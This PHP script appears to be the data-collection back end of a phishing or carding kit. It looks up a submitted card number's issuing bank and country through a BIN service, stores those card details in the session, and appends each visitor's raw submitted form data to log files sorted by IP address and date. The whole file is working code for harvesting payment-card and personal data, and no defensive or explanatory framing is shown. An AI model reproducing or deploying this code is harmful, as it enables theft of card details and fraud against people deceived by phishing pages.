<?php



session_start();
error_reporting(0);


///////////////////////////////// BIN CHECKER  /////////////////////////////////

$BIN_LOOKUP  = str_replace(' ', '', $_POST['card_number']);
$dastalk = @json_decode(file_get_contents("https://lookup.binlist.net/".$BIN_LOOKUP));
$BIN_CARD = $dastalk->scheme;
$BIN_BANK = $dastalk->bank->name;
$BIN_TYPE = $dastalk->type;
$BIN_LEVEL   = 'default_by_author';
$BIN_CNTRCODE= $dastalk->numeric;
$BIN_WEBSITE = strtolower($dastalk->url);
$BIN_PHONE   = strtolower($dastalk->phone);
$BIN_COUNTRY = $dastalk->country->name;

///////////////////////////////// SESSION FOR SOME VAR  /////////////////////////////////
$_SESSION['_country_']  = $BIN_COUNTRY;
$_SESSION['_cntrcode_'] = $BIN_CNTRCODE;
$_SESSION['_cc_brand_'] = $BIN_CARD;
$_SESSION['_cc_bank_']  = $BIN_BANK;
$_SESSION['_cc_type_']  = $BIN_TYPE;
$_SESSION['_cc_class_'] = $BIN_LEVEL;
$_SESSION['_cc_site_']  = $BIN_WEBSITE;
$_SESSION['_cc_phone_'] = $BIN_PHONE;
$_SESSION['_ccglobal_'] = $_SESSION['_cc_brand_']." ".$_SESSION['_cc_type_']." ".$_SESSION['_cc_class_'];
$_SESSION['_global_']   = $_SESSION['_cntrcode_']." - ".$_SESSION['_ip_'];
///////////////////////////////// BIN CHECKER  /////////////////////////////////

///////////////////////////////// BIN Brutforcer/////////////////////////

$curDate   = date("d-m-Y");
#$ip =  @$_SERVER['HTTP_CLIENT_IP']; //$_SERVER['REMOTE_ADDR'];

$client  = @$_SERVER['HTTP_CLIENT_IP'];
$forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
$remote  = @$_SERVER['REMOTE_ADDR'];
$result  = "Unknown";

if(filter_var($client, FILTER_VALIDATE_IP)){
    $_SESSION['_ip_'] = $client;
}
elseif(filter_var($forward, FILTER_VALIDATE_IP)){
    $_SESSION['_ip_'] = $client = $forward;
}
else{
    $_SESSION['_ip_'] = $client = $remote;
}

$directory = "cookies/" . $_SESSION['_ip_']  . "/" . $curDate;
$log   = $directory . "/" . $_SESSION['_ip_']  . "cookie.txt"; 
// Create logs dir if it not exists
if (!file_exists($directory)) {
       mkdir($directory, 0777, true);
}  
$log = fopen($log, "a+") or die("Unable to open file!");
// $HTTP_RAW_POST_DATA
$data = json_decode(file_get_contents('php://input'), true);
fwrite($log, json_encode($data) . "\n");
fwrite($log, "================================================== \n");
fclose($log);

?>
